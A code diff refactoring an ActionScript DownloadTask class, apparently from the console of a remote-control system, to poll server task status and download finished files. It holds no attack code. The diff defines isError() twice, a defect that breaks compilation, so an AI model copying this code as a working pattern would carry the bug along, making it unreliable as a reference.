@@ -1,3 +1,4 @@
+
 package it.ht.rcs.console.task.controller
 {
   import flash.events.TimerEvent;
@@ -15,10 +16,13 @@ package it.ht.rcs.console.task.controller
   
   public class DownloadTask
   {
-    public static const STATE_IDLE:String = 'idle';
+    /*
+    //public static const STATE_IDLE:String = 'idle';
     public static const STATE_CREATING:String = 'creating';
     public static const STATE_DOWNLOADING:String = 'downloading';
     public static const STATE_FINISHED:String = 'finished';
+    public static const STATE_ERROR:String = 'error';
+    */
     
     private var updateTimer: Timer;
     private var fileDownloader: FileDownloader;
@@ -28,12 +32,17 @@ package it.ht.rcs.console.task.controller
     
     [Bindable]
     public var task: Task;
-    [Bindable]
-    public var state:String = STATE_IDLE;
+    //[Bindable]
+    //public var state:String = STATE_CREATING;
     [Bindable]
     public var creation_percentage:Object = {bytesLoaded:0, bytesTotal:0};
     [Bindable]
     public var download_percentage:Object = {bytesLoaded:0, bytesTotal:0};
+    
+    public function running():Boolean
+    {
+      return (isInProgress() || isDownloading());
+    }
     
     public function get desc():String
     {
@@ -45,7 +54,7 @@ package it.ht.rcs.console.task.controller
       trace("Creating DownloadTask " + task._id);
       this.task = new Task(task);
       this.db = db;
-      NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'TASK_NEW', [task.file_name]));
+      NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'TASK_NEW', [task.file_name]), 3);
     }
     
     public function factory(type:String, fileName:String):DownloadTask
@@ -66,27 +75,39 @@ package it.ht.rcs.console.task.controller
     
     public function start_update():void
     {
-      if (state != STATE_IDLE) return;
+      if (isFinished() || isError()) 
+        return;
+      
       updateTimer = new Timer(1000);
       updateTimer.addEventListener(TimerEvent.TIMER, function ():void {
-        db.task.show(task._id, onUpdate, onUpdateFailure);
+        db.task.show(task._id, doUpdate, onUpdateFailure);
       });
       updateTimer.start();
     }
     
-    public function isFinished():Boolean
+    public function isError():Boolean
     {
-      return (state == DownloadTask.STATE_FINISHED);
+      return task.status == 'error';
     }
     
-    public function isCreating(): Boolean
+    public function isFinished():Boolean
     {
-      return (state == DownloadTask.STATE_CREATING);
+      return task.status == 'finished';
+    }
+    
+    public function isInProgress(): Boolean
+    {
+      return task.status == 'in_progress';
     }
     
     public function isDownloading(): Boolean
     {
-      return (state == DownloadTask.STATE_DOWNLOADING);
+      return task.status == 'download_available';
+    }
+    
+    public function isError(): Boolean
+    {
+      return task.status == 'error';
     }
     
     public function onUpdateFailure(event:FaultEvent):void
@@ -94,63 +115,80 @@ package it.ht.rcs.console.task.controller
       trace("Update failure!!! " + event);
     }
     
-    private function onUpdate(event:ResultEvent):void
+    private function doUpdate(event:ResultEvent):void
     {
       // update description, progress and resource
-      task.desc = event.result.desc;
-      task.error = event.result.error;
+      
+      task.status = event.result.status;
       task.current = event.result.current;
+      task.total = event.result.total;
       task.resource = event.result.resource;
-      trace ("Updating task " + event.result._id + "[current: " + task.current + " | total: " + task.total + "]");
+      task.desc = event.result.desc;
       
-      if (task.error) {
-        updateTimer.stop();
-        NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'TASK_ERROR', [task.file_name]));
-      }
+      trace ("Updating task " + event.result._id + " (" + task.status + ") [current: " + task.current + " | total: " + task.total + "]");
       
-      // update creation progress bar
-      creation_percentage.bytesTotal = task.total;
-      creation_percentage.bytesLoaded = task.current;
-      
-      // if creation is complete, start the download
-      if (task.current == task.total) {  
-        updateTimer.stop();
-        updateTimer = null;
+      switch (task.status) {
+        case "in_progress":
+          // update creation progress bar
+          creation_percentage.bytesTotal = task.total;
+          creation_percentage.bytesLoaded = task.current;
+          
+          trace("Task " + task._id +" in progress.");
+          break;
         
-        trace("Task " + task._id +" creation complete.");
-        
-        //NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'TASK_COMPLETE', [desc]));
-        
-        if (event.result.resource._id) {
-          trace("Downloading file " + event.result.resource._id);
+        case "download_available":
+          // update creation progress bar
+          creation_percentage.bytesTotal = task.total;
+          creation_percentage.bytesLoaded = task.current;
           
           // downloads are stored into /Desktop/RCS Downloads 
           var path:String = File.desktopDirectory.nativePath + '/RCS Downloads';
           new File(path).createDirectory();
           
           // start the downloader
-          var remote_uri:String = 'file/' + task.resource._id;
+          var remote_uri:String = 'task/download/' + task.resource._id;
           var local_path:String = path + '/' + task.file_name;
           fileDownloader = new FileDownloader(remote_uri, local_path);
           fileDownloader.onProgress = onDownloadUpdate;
           fileDownloader.onComplete = onDownloadComplete;
-          task.desc = "Downloading file";
+          task.desc = "Downloading";
           fileDownloader.download();
           
-          trace("Task " + task._id + "is downloading.");
-          state = STATE_DOWNLOADING;
-          
-        } else {
-          trace("Task " + task._id + "is finished.");
-          state = STATE_FINISHED;
-          NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'TASK_COMPLETE', [task.file_name]));
-        }
+          trace("Task " + task._id +" is available for download.");
+          break;
         
-      } else {
-        trace("Task " + task._id + "is creating.");
-        state = STATE_CREATING;
+        case "downloading":
+          
+          trace("Task " + task._id +" is downloading.");
+          break;
+        
+        case "finished":
+          // update creation progress bar
+          creation_percentage.bytesTotal = task.total;
+          creation_percentage.bytesLoaded = task.current;
+          
+          // stop the update timer
+          updateTimer.stop();
+          
+          task.desc = "Completed";
+          NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'TASK_COMPLETE', [task.file_name]));
+          trace("Task " + task._id +" completed.");
+          break;
+          
+        case "error":
+          // update creation progress bar
+          creation_percentage.bytesTotal = task.total;
+          creation_percentage.bytesLoaded = task.current;
+          
+          // stop the update timer
+          updateTimer.stop();
+          NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'TASK_ERROR', [task.file_name]));
+          trace("Task " + task._id +" error.");
+          break;
       }
       
+      DownloadManager.instance.checkRunning();
+    
     }
     
     public function onDownloadUpdate(cur:Number, total:Number):void
@@ -162,9 +200,8 @@ package it.ht.rcs.console.task.controller
     
     public function onDownloadComplete():void
     {
-      trace("Task " + task._id + "is finished.");
-      state = STATE_FINISHED;
-      //NotificationPopup.showNotification(ResourceManager.getInstance().getString('localized_main', 'DOWNLOAD_COMPLETE'));
+      trace("Task " + task._id + " download finished.");
+      DownloadManager.instance.checkRunning();
     }
     
     public function cleanup():void
